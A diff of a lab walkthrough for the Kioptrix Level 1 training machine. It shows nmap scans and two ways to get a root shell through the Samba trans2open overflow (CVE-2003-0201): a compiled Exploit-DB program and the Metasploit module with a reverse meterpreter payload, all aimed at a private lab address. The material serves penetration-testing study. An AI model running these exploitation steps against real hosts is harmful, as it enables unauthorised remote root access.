@@ -9,8 +9,9 @@ By Kioptrix
 ## Enumeration ##
 * We are first greeted with a login page that requires users to specify a set of credentials:
 ![](/screenshots/kioptrix-level-1/loginInitial.jpg)
-* Run `nmap 10.0.2.*`, where we find `10.0.2.12` to be the IP address of the vulnerable machine. 6 services were also discovered, where they are all in an Open state.
+* Run `nmap -T5 10.0.2.*`, where we find `10.0.2.12` to be the IP address of the vulnerable machine. 6 services were also discovered, where they are all in an Open state.
 ![](/screenshots/kioptrix-level-1/nmapScan.jpg)
+* Note: This screenshot was updated during a re-visit of the machine.
 * Run `nmap -sC -sV -T5 -p- 10.0.2.12` to enumerate the running services:
 ![](/screenshots/kioptrix-level-1/hostFullScan.jpg)
 * Note: This screenshot was updated during a re-visit of the machine.
@@ -71,23 +72,23 @@ By Kioptrix
 4. Use a [ported Python-equivalent script](https://github.com/0v3rride/Enum4LinuxPy) (that was ported over from the original Perl version)
 
 ### 2 Avenues to Obtain Root Shell Through BoF Vulnerability ###
+* According to [a cvedetails page for a vulnerability associated with Samba 2.2.1a](https://www.cvedetails.com/cve/CVE-2003-0201/), the name of the exploit is due to a "buffer overflow in the call_trans2open function in trans2.c". Accoding to the [SecurityFocus's entry page on this vulnerability](https://www.securityfocus.com/bid/7294/discuss) "The problem occurs when copying user-supplied data into a static buffer. By passing excessive data to an affected Samba server, it may be possible for an anonymous user to corrupt sensitive locations in memory. Successful exploitation of this issue could allow an attacker to execute arbitrary commands, with the privileges of the Samba process."
 * There are 2 general avenues to get a `root` shell in this section, one through a Metasploit module, and the other through non-Metasploit methods. There are multiple POCs available for the latter, especially as seen in the [exploit's section of the remote buffer overflow vulnerability that is used](https://www.securityfocus.com/bid/7294/exploit).
 * Note: Those links listed in the page no longer work (for me at least).
 * Note-to-self: When in doubt if POCs are using the same vulnerability, use the CVE listed as one of the ways to determine. I was confused initially because of the naming of the exploit that made me mistake that there were more than 1 vulnerability here that could get us a `root` shell.
 
 ### trans2open Overflow (Non-Metasploit) ###
-* With the Samba version obtained, our [first Google search result](https://www.exploit-db.com/exploits/10) (which is from Exploit-DB) for `samba 2.2.1a exploit` was able to give us a `root` shell easily - through a `Remote Code Execution`:
+* Our [first Google search result](https://www.exploit-db.com/exploits/10) (which is from Exploit-DB) for `samba 2.2.1a exploit` was able to give us a `root` shell easily - through `Remote Code Execution`:
 ![](/screenshots/kioptrix-level-1/sambaExploitGoogleSearch.jpg)
 * After downloading and compiling the code (`gcc 10.c`), run `./a.out -b 0 10.0.2.12`:
 ![](/screenshots/kioptrix-level-1/sambaRemoteRootExploit.jpg)
 * Note: The `-b` parameter indicates the platform: `0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2`. Choosing any of the numbers except 3 would result in a `root` shell.
 * Note: Running `exit` seems to be a little buggy for me, i.e. the shell does not terminate immediately.
+* **Question**: The [second Google search](https://www.exploit-db.com/exploits/7) result (which is also from Exploit-DB) is a Perl script that does not result in any shell (and which also seems to run indefinitely - I killed it after around 10 minutes). I ran the command: `perl 7.pl -t linx86 -H 10.0.2.6 -h 10.0.2.12`.
 
 ### trans2open Overflow (Metasploit) ###
-* The [second Google search](https://www.exploit-db.com/exploits/7) result (which is also from Exploit-DB) shows that the Samba version is also susceptible to a `Remote Buffer Overflow`, specifically a trans2open overflow. [A Rapid7 entry](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open) shows that there is a Metasploit module available pertaining to it for our use.
-* According to [a cvedetails page for this vulnerability](https://www.cvedetails.com/cve/CVE-2003-0201/), the name of the exploit is due to a "buffer overflow in the call_trans2open function in trans2.c". Accoding to the [SecurityFocus's entry page on this vulnerability](https://www.securityfocus.com/bid/7294/discuss) "The problem occurs when copying user-supplied data into a static buffer. By passing excessive data to an affected Samba server, it may be possible for an anonymous user to corrupt sensitive locations in memory. Successful exploitation of this issue could allow an attacker to execute arbitrary commands, with the privileges of the Samba process."
-* **Question**: Not exactly sure why the Perl script from the Exploit-DB page does not result in any shell despite running for around 10 minutes. My executed command was `perl 7.pl -t linx86 -H 10.0.2.6 -h 10.0.2.12`.
-* Searching with the keyword `trans2open` after running `msfconsole` gives us 4 results, with each being applicable to only the respective OSes. We will be using the one for `Linux x86` (**where did we get this piece of information? i.e. how do we know we should be using Linux?**)
+* [A Rapid7 entry](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open) shows that there is a Metasploit module available pertaining to it for our use.
+* Searching with the keyword `trans2open` after running `msfconsole` gives us 4 results, with each being applicable to only the respective OSes. We will select the `Linux x86` one, based on our information obtained earlier from enumeration using a Metasploit auxiliary module.
 ![](/screenshots/kioptrix-level-1/metasploitTrans2openModules.jpg)
 * Alternatively, instead of searching, we can directly use the information given in the Rapid7 page: `use exploit/linux/samba/trans2open`.
 * `options` tells us that we need to `set RHOSTS 10.0.2.12`. Running `exploit` immediately afterwards results in many meterpreter sessions being open and 'dying' instantly. `options` shows us that our default payload used was `linux/x86/meterpreter/reverse_tcp`:
